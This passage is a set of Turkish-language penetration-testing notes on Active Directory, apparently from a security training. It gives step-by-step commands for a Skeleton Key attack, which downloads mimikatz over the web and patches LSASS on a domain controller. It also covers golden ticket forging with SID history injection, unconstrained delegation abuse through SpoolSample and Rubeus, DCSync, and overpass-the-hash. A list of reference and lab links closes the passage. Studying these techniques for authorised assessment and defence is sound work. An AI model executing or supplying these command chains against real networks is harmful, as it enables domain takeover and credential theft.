	Skeleton Key yöntemiyle ise DC üzerinde LSASS processi patchlenerek tüm kullanıcıların belirli bir parola (master key) ile giriş yapmasını sağlar. Saldırgan bu sayede istediği kullanıcı ile oturum açabilmektedir.

		# Mimikatz indiriliyor

			iwr -Uri https://github.com/frknozr/hacktrick22/raw/main/mimikatz.exe -outfile mimikatz.exe

		# Mimikatz ile Skeleton Key oluşturuluyor, master key mimikatz olarak ayarlanıyor

			.\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

		# Plaintext parola secure-string formatına dönüştürülüyor

			$SecPassword = ConvertTo-SecureString 'mimikatz' -AsPlainText –Force

		# Kullanıcı adı ve parola ile credential objesi oluşturuluyor

			$Cred = New-Object System.Management.Automation.PSCredential('istanbul\administrator',$SecPassword)

		# Admin kullanıcısıyla parola olarak da mimikatz kullanılarak dcde komut çalıştırılıyor

			Enter-PSSession -ComputerName dc -Credential $Cred

# Golden Ticket with SIDHistory Injection ile child domainden parent domaine doğru yetki yükseltme gerçekleştirilebilmektedir.

	Get-AD SIDADmin komutu ile hem child domainin (death.darkside.local) hem de parent domainin (darkside.local) SID bilgileri elde edilebiliyor. Sonrasında mimikatz komutları ile bu SID değerine göre tgt yaratılabilir. TGT yaratıldıktan sonra ilgili domainlere erişim sağlanabilir hale getirilebiliyor.

		Örnek sömürü komutları

			$ Get-ADDomain -Identity death.darkside.local | select DomainSID

			$ .\mimikatz.exe "kerberos::golden /user:administrator /domain:death.darkside.local /sid:S-1-5-21-218427654-2092538031-2821005941 /krbtgt:43eab7b88a658ebec61b980bbacf2092 /id:500 /sids:S-1-5-21-218427654-2092538031-2821005941-519 /ptt" "exit"; 

# Bir domainde hem yetki yükseltmek hem de diğer bir domaine geçiş için önemli bir metodoloji. UNCONSTRAINED DELEGATION EXPLOITATION \w SpoolSvc

	bu zafiyet için unconstraıned delegatıon olan makine üzerinde local admin yetkilerine sahip olmak yeterli oluyor

	unconstrained shell aldık ama kimse sisteme login olmuyo yani impersonate edeceğimiz token bulamıyoruz diyelim. O zaman spool servisi üzerinden (petitpotam gibi) ile bir istek tetikletiyoruz ve spool servisi üzerinden istek gelmesi sayesinde bir tgt hashi geliyor olacak ve biz rubeus ile dinlediğimiz için o tgt hashini dump edebiliyoruz.

		# Rubeus TGT biletlerini izleyebilmek için monitör modda başlatılıyor
			$ .\Rubeus.exe monitor /interval:5 /nowrap

		# Parent domain dc’si için SpoolSample tetikleniyor
			$ spoolsample.exe <hedef DC> <rubeus ile dinleme yapılan server>

			Ve rubeus dinleme yapan cmd ekranına hedef DC'nin TGT hashi gelmiş oluyor. Sonrasında ise over the pth yapmak gerekiyor yani pth üzerinden tgt auth

		# Elde edilen ticket rubeus ile inject ediliyor
			$ .\Rubeus.exe ptt /ticket:<ticket>

		# Ticketlar görüntüleniyor
			$ klist

		# DcSync ile parent domain administrator hash değeri alınıyor
			$ .\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:darkside.local /user:administrator@darkside.local" "exit"

				[not: user parametresinden sonra @ karakteri ile domaini belirtmemizin sebebi: Eğer bir forest yapısı var ise ve admibistrator kullanıcısı birden fazla domainde mevcut ise komut çalışırken hata veriyor. Bu sebep ile administrator kullanıcısının hangi domainden olduğunu belirtmemiz gerekiyor.]

		# Over PTH ile yetkili process oluşturuluyor
			$ .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:darkside.local /ntlm:5b5f2edd2b666e7adce3be617a8f6600" "exit"

				Ve artık güncel yetkiler ile yeni bir cmd ekranı açıyor. Açılan bu cmd üzerinden de "enter-pssession" veya "invoke-command" ile parent domainin pc'sine erişim sağlanabilir duruma geliyor.


### References###

	https://github.com/Hacktrickconf/Hacktrick-22/blob/main/E%C4%9Fitimler/Active%20Directory%20Security%20Assessment/Hacktrick%20-%20Active%20Directory%20Security%20Assessment.pdf

### Other Notes ###

	# AD Lab Setup'u için DetectionLab kullanılabilir. Ayrıca "badblood" githubu eklenebilir.

	# Tools

	    https://www.pingcastle.com/download/
	    https://www.purple-knight.com/
	    https://github.com/lkarlslund/adalanche
	    https://github.com/davidprowe/BadBlood
	    https://github.com/WazeHell/vulnerable-AD
	    https://detectionlab.network/
	    https://github.com/orgs/forestallio

	# Blogs

		https://www.ired.team/ 
		https://identityandsecuritydotcom.files.wordpress.com/2020/04/adsa-1-1.pdf 
		https://adsecurity.org/ 
		https://forestall.io/blog/
		https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces

	# Active Directory Delegation Yöntemleri

		https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html

